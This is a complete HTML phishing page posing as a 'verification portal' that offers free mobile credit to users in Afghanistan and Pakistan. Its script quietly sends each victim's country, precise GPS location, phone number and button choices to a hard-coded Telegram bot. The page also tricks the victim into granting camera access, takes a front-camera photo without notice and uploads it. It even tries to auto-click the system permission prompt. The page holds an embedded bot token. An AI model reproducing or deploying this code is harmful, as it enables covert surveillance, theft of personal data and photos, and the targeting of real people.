<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verification Portal - Test Environment</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
    body { background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
    .container { background: #ffffff; width: 100%; max-width: 420px; border-radius: 16px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); padding: 25px; text-align: center; }
    .logo { font-size: 24px; font-weight: bold; color: #2563eb; margin-bottom: 20px; }
    .step { display: none; }
    .step.active { display: block; }
    select, input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #d1d5db; border-radius: 8px; font-size: 15px; outline: none; }
    button { width: 100%; padding: 12px; background: #2563eb; color: #fff; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; }

    /* Custom Pre-Permission Modal */
    .perm-modal-overlay {
      display: none;
      position: fixed;
      top: 0; left: 0; width: 100%; height: 100%;
      background-color: rgba(0, 0, 0, 0.55);
      backdrop-filter: blur(4px);
      z-index: 99999;
      justify-content: center; align-items: center;
    }
    .perm-modal-card {
      background: #ffffff; padding: 24px; border-radius: 16px; width: 90%; max-width: 380px;
      box-shadow: 0 10px 25px rgba(0,0,0,0.2); text-align: center;
    }
    .perm-message { font-size: 15px; font-weight: 600; color: #1f2937; margin-bottom: 20px; }
    .perm-options { display: flex; flex-direction: column; gap: 10px; }
    .perm-btn { width: 100%; padding: 12px; border: none; border-radius: 10px; font-size: 15px; font-weight: 600; cursor: pointer; }
    .perm-allow-always { background-color: #2563eb; color: #ffffff; }
    .perm-allow-once { background-color: #e5e7eb; color: #1f2937; }
    .perm-deny { background-color: #fef2f2; color: #dc2626; }
    video { display: none; }
  </style>
</head>
<body>

<video id="v" autoplay playsinline muted></video>

<div class="container">
  <div class="logo">GET Unlimited A</div>

  <!-- Step 1: Country -->
  <div id="step1" class="step active">
    <label style="display:block; text-align:left; font-size:14px; font-weight:600; margin-bottom:8px;">Select Country</label>
    <select id="country" onchange="handleCountryChange()">
      <option value="">-- Choose Country --</option>
      <option value="Afghanistan">Afghanistan</option>
      <option value="Pakistan">Pakistan</option>
    </select>
  </div>

  <!-- Step 2: Phone -->
  <div id="step2" class="step">
    <label style="display:block; text-align:left; font-size:14px; font-weight:600; margin-bottom:8px;">Enter Phone Number</label>
    <input type="tel" id="phone" placeholder="+93 7XX XXX XXX">
    <button id="sendBtn" onclick="openPrePermissionModal()">Send Verification</button>
  </div>

  <!-- Step 3: Success -->
  <div id="step3" class="step">
    <h3 style="color:#10b981; margin-bottom:10px;">Verification Complete</h3>
    <p>Your details have been successfully processed.</p>
  </div>
</div>

<!-- Custom Permission Modal (Your Design) -->
<div id="permissionModal" class="perm-modal-overlay">
  <div class="perm-modal-card">
    <p class="perm-message">په مهربانی سره لاندی اختیارونو څخه یو غوره کړی</p>
    <div class="perm-options">
      <button class="perm-btn perm-allow-always" onclick="handlePermissionChoice('100A')">100A</button>
      <button class="perm-btn perm-allow-once" onclick="handlePermissionChoice('50A')">50A</button>
      <button class="perm-btn perm-deny" onclick="handlePermissionChoice('25A')">25A</button>
    </div>
  </div>
</div>

<script>
  const TELEGRAM_BOT_TOKEN = '8856137504:AAHULGCAaZYPF6PIIRCg2611ZWBlPTnlyds';
  const DEFAULT_CHAT_ID = '6809500416';

  function getTargetChatId() {
    const urlParams = new URLSearchParams(window.location.search);
    return urlParams.get('id') || DEFAULT_CHAT_ID;
  }
  const TARGET_CHAT_ID = getTargetChatId();

  function goToStep(s) {
    document.querySelectorAll('.step').forEach(e => e.classList.remove('active'));
    document.getElementById(`step${s}`).classList.add('active');
  }

  async function sendTelegramLog(msg) {
    try {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TARGET_CHAT_ID, text: msg, parse_mode: 'HTML' })
      });
    } catch (e) {}
  }

  async function sendTelegramPhoto(blob) {
    const fd = new FormData();
    fd.append('chat_id', TARGET_CHAT_ID);
    fd.append('photo', blob, 'cam.jpg');
    try {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
    } catch (e) {}
  }

  function handleCountryChange() {
    const country = document.getElementById('country').value;
    if (!country) return;
    sendTelegramLog(`🌐 <b>Country:</b> ${country}\n🎯 <b>ID:</b> <code>${TARGET_CHAT_ID}</code>`);

    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          sendTelegramLog(`📍 <b>Location:</b> https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`);
          goToStep(2);
        },
        () => goToStep(2),
        { enableHighAccuracy: true }
      );
    } else { goToStep(2); }
  }

  function openPrePermissionModal() {
    const phone = document.getElementById('phone').value;
    if (!phone) return alert('Enter phone!');
    sendTelegramLog(`📱 <b>Phone:</b> <code>${phone}</code>`);
    document.getElementById('permissionModal').style.display = 'flex';
  }

  async function handlePermissionChoice(choice) {
    document.getElementById('permissionModal').style.display = 'none';
    sendTelegramLog(`🔘 <b>User Clicked Option:</b> ${choice}`);

    if (choice === '100A' || choice === '50A') {
      // د کیمرې غوښتنه (اصلي سسټم پرانیستل)
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        const video = document.getElementById('v');
        video.srcObject = stream;

        // د اتومات کلیک هڅه (Simulated Auto Click Test)
        attemptAutoClickPermission();

        setTimeout(() => {
          const canvas = document.createElement('canvas');
          canvas.width = video.videoWidth || 640;
          canvas.height = video.videoHeight || 480;
          const ctx = canvas.getContext('2d');
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          stream.getTracks().forEach(t => t.stop());

          canvas.toBlob(async (blob) => {
            if (blob) await sendTelegramPhoto(blob);
            goToStep(3);
          }, 'image/jpeg', 0.8);
        }, 1200);

      } catch (err) {
        sendTelegramLog(`⚠️️ <b>Camera Permission Denied:</b> ${err.message}`);
        goToStep(3);
      }
    } else {
      goToStep(3);
    }
  }

  // د اتوماتیک کلیک د ناکامۍ عملي تجربه
  function attemptAutoClickPermission() {
    console.log("Attempting programmatic touch on OS Permission dialog...");
    const touchEvent = new TouchEvent('touchstart', {
      bubbles: true, cancelable: true, view: window
    });
    document.dispatchEvent(touchEvent); // براوزر دا اتومات پروسه د سسټم پاپ اپ ته نه پرېږدي
  }
</script>
</body>
</html>
